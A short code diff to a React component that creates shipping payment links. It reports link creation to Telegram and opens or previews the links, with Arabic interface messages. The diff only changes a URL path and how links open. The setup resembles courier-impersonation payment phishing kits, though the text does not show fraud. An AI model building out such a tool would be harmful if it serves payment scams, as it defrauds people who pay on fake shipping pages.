@@ -73,7 +73,7 @@ const CreateShippingLink = () => {
         },
       });
 
-      const paymentUrl = `${window.location.origin}/pay/${link.id}/track?service=${selectedService}`;
+      const paymentUrl = `${window.location.origin}/pay/${link.id}/recipient?service=${selectedService}`;
 
       const telegramResult = await sendToTelegram({
         type: 'shipping_link_created',
@@ -127,6 +127,7 @@ const CreateShippingLink = () => {
         title: "تم النسخ",
         description: "تم نسخ رابط الدفع إلى الحافظة",
       });
+      window.open(createdLinkUrl, "_blank", "noopener,noreferrer");
     } catch (error) {
       console.error("Copy link error:", error);
       toast({
@@ -139,7 +140,7 @@ const CreateShippingLink = () => {
 
   const handlePreviewLink = () => {
     if (!createdLinkUrl) return;
-    window.open(createdLinkUrl, "_blank", "noopener,noreferrer");
+    window.location.href = createdLinkUrl;
   };
   
   if (!countryData) {
